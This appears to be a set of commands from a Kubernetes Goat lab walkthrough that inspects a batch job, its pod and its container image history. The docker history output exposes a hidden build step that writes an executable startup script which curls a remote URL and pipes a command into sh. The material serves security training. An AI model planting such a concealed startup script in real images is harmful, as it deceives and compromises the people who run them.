kubectl get jobs

kubectl describe job batch-check-job

kubectl get pods --namespace default -l "job-name=batch-check-job"

kubectl get pod batch-check-job-954nv -o yaml
docker history --no-trunc madhuakula/k8s-goat-batch-check
...
echo "curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 && echo 'id' | sh " > /usr/bin/system-startup && chmod +x /usr/bin/system-startup
...
